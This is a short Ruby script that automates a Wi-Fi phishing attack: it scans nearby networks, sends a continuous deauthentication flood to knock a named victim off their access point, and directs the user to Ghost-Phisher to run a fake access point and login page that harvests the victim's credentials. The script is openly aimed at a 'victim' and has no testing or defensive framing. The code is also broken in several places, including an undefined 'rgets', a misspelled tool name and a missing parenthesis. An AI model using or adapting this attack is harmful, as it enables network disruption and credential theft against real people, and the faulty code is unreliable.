#!/bin/ruby

print("Please open Ghost-Phisher on your Kali machine.
")
print("I will now print out all the SSIDs near you. Choose
the one that the user you want to attack is connected to.
")
interface = rgets("Before continuing, I will need to know
the name of the interface that you plan on using for this
attack. Name of interface: 
")
system('gnome-terminal -e "bash -c \"airodump-ng #{interface}; exec bash\""')
bssid = rgets("What is the name of the BSSID that your victim
is connected to: 
")
system("ifconfig #{interface} down")
system("iwconfig #{interface} mode monitor")
system("ifconfig #{interface} up")
system('gnome-terminal -e "bash -c \"airodump-ng #{interface} --bssid #{bssid}; exec bash\""')
system("ifconfig #{interface} down")
system("iwconfig #{interface} mode managed")
system("ifconfig #{interface} up")
victim_mac = rgets("What is the MAC address of your victim: 
")
print("WARNING: DO NOT CLOSE THE TERMINAL ABOUT TO BE OPENED!!!")
system('gnome-terminal -e "bash -c \"aireply-ng -0 0 -a #{bssid} -c #{victim_mac} #{interface}; exec bash\""')
print("In Ghost-Phisher, please create an access point, using
a wireless card other than the #{interface}.
")
print("Go to the 'Fake HTTP Server' tab and click on 'Select
Webpage,' select one of the HTML files in the 'Deauth_for_Creds' 
folder.")
print("Go to the 'Harvested Credentials' tab and look for your
victim's information."
print("As soon as you see the information you need, 'ctrl +
c' the terminal running the deauthentication attack.")
print("Enjoy your credentials!")